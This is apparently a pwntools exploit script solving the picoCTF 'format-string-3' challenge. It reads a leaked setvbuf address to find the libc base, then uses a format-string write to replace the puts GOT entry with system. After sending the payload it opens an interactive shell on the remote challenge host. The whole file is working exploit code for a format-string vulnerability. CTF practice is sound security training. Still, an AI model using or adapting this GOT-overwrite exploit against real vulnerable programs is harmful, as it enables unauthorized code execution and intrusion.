#!/usr/bin/env python3
import pwn

exe = pwn.ELF("./format-string-3_patched")
libc = pwn.ELF("./libc.so.6")
ld = pwn.ELF("./ld-linux-x86-64.so.2")
pwn.context.binary = exe

payload = b""


def connect():
    # io = pwn.process(exe.path)
    io = pwn.remote("rhea.picoctf.net", 64906)
    return io


def b(x):
    return x.to_bytes(8, "little")


def send(p):
    global payload
    io = pwn.process(exe.path)
    io.sendline(p)
    payload = p
    resp = io.recvall()
    return resp


def main():
    io = connect()

    io.recvuntil(b"setvbuf in libc: ")
    leak = int(io.recvline().strip(), 16)
    libc.address = leak - libc.symbols["setvbuf"]

    pwn.log.info("libc.address = %s" % hex(libc.address))

    fs = pwn.FmtStr(execute_fmt=send)
    fs.write(exe.got["puts"], libc.symbols["system"])
    fs.execute_writes()

    with open("./payload", "wb") as f:
        f.write(payload)

    io.sendline(payload)
    io.recvuntil(b"\x18@@")
    io.interactive()


if __name__ == "__main__":
    main()
